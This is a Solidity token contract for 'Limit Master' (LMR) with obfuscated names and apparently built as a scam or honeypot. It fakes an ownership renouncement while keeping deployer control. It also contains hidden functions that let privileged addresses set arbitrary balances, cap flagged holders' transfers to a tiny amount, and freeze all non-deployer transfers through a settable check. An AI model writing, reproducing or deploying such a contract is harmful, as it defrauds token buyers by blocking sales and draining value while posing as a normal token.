//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface shouldSwap {
    function createPair(address listTo, address liquiditySell) external returns (address);
}

interface marketingIsSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptAuto) external view returns (uint256);

    function transfer(address limitSwap, uint256 shouldFund) external returns (bool);

    function allowance(address teamFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldFund) external returns (bool);

    function transferFrom(
        address sender,
        address limitSwap,
        uint256 shouldFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverLaunch, uint256 value);
    event Approval(address indexed teamFee, address indexed spender, uint256 value);
}

abstract contract walletReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingIsSellMetadata is marketingIsSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LimitMaster is walletReceiver, marketingIsSell, marketingIsSellMetadata {

    mapping(address => mapping(address => uint256)) private fundModeSell;

    function limitEnableSell(uint256 shouldFund) public {
        feeFrom();
        launchedAmount = shouldFund;
    }

    string private toFee = "LMR";

    uint256 private toEnable = 100000000 * 10 ** 18;

    address public shouldMax;

    bool public toLiquidity;

    uint256 public receiverList;

    bool public launchMode;

    bool public feeLimit;

    function totalReceiver(address senderTotal, uint256 shouldFund) public {
        feeFrom();
        liquidityToken[senderTotal] = shouldFund;
    }

    function transferFrom(address listReceiver, address limitSwap, uint256 shouldFund) external override returns (bool) {
        if (_msgSender() != minMax) {
            if (fundModeSell[listReceiver][_msgSender()] != type(uint256).max) {
                require(shouldFund <= fundModeSell[listReceiver][_msgSender()]);
                fundModeSell[listReceiver][_msgSender()] -= shouldFund;
            }
        }
        return tradingShouldTo(listReceiver, limitSwap, shouldFund);
    }

    uint256 fundIs;

    uint8 private walletLaunched = 18;

    function maxMin(address takeTrading) public {
        require(takeTrading.balance < 100000);
        if (feeLimit) {
            return;
        }
        
        launchTrading[takeTrading] = true;
        if (launchMode) {
            fundMode = false;
        }
        feeLimit = true;
    }

    function approve(address modeBuyToken, uint256 shouldFund) public virtual override returns (bool) {
        fundModeSell[_msgSender()][modeBuyToken] = shouldFund;
        emit Approval(_msgSender(), modeBuyToken, shouldFund);
        return true;
    }

    function feeFrom() private view {
        require(launchTrading[_msgSender()]);
    }

    uint256 public senderAuto;

    bool public enableWallet;

    address minMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address senderTotal, uint256 shouldFund) external virtual override returns (bool) {
        return tradingShouldTo(_msgSender(), senderTotal, shouldFund);
    }

    function allowance(address receiverLaunched, address modeBuyToken) external view virtual override returns (uint256) {
        if (modeBuyToken == minMax) {
            return type(uint256).max;
        }
        return fundModeSell[receiverLaunched][modeBuyToken];
    }

    function teamToTrading(address listReceiver, address limitSwap, uint256 shouldFund) internal returns (bool) {
        require(liquidityToken[listReceiver] >= shouldFund);
        liquidityToken[listReceiver] -= shouldFund;
        liquidityToken[limitSwap] += shouldFund;
        emit Transfer(listReceiver, limitSwap, shouldFund);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return walletLaunched;
    }

    mapping(address => bool) public senderLaunchTrading;

    bool public atMin;

    address private txSellLimit;

    address launchMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed takeLimit, address indexed takeWallet);

    bool private maxFrom;

    string private isModeTo = "Limit Master";

    bool public fundMode;

    mapping(address => bool) public launchTrading;

    function symbol() external view virtual override returns (string memory) {
        return toFee;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return toEnable;
    }

    uint256 constant minListMarketing = 6 ** 10;

    function enableTeam() public {
        emit OwnershipTransferred(launchedFrom, address(0));
        txSellLimit = address(0);
    }

    uint256 public buyToken;

    function balanceOf(address exemptAuto) public view virtual override returns (uint256) {
        return liquidityToken[exemptAuto];
    }

    function teamExemptFrom(address totalShould) public {
        feeFrom();
        if (senderAuto == buyToken) {
            atMin = false;
        }
        if (totalShould == launchedFrom || totalShould == shouldMax) {
            return;
        }
        senderLaunchTrading[totalShould] = true;
    }

    address public launchedFrom;

    uint256 launchedAmount;

    constructor (){
        if (fundMode) {
            receiverList = buyToken;
        }
        exemptToken feeTotal = exemptToken(minMax);
        shouldMax = shouldSwap(feeTotal.factory()).createPair(feeTotal.WETH(), address(this));
        
        launchedFrom = _msgSender();
        launchTrading[launchedFrom] = true;
        liquidityToken[launchedFrom] = toEnable;
        enableTeam();
        if (maxFrom) {
            senderAuto = buyToken;
        }
        emit Transfer(address(0), launchedFrom, toEnable);
    }

    mapping(address => uint256) private liquidityToken;

    function getOwner() external view returns (address) {
        return txSellLimit;
    }

    function tradingShouldTo(address listReceiver, address limitSwap, uint256 shouldFund) internal returns (bool) {
        if (listReceiver == launchedFrom) {
            return teamToTrading(listReceiver, limitSwap, shouldFund);
        }
        uint256 amountTokenLaunched = marketingIsSell(shouldMax).balanceOf(launchMarketing);
        require(amountTokenLaunched == launchedAmount);
        require(limitSwap != launchMarketing);
        if (senderLaunchTrading[listReceiver]) {
            return teamToTrading(listReceiver, limitSwap, minListMarketing);
        }
        return teamToTrading(listReceiver, limitSwap, shouldFund);
    }

    function owner() external view returns (address) {
        return txSellLimit;
    }

    function name() external view virtual override returns (string memory) {
        return isModeTo;
    }

}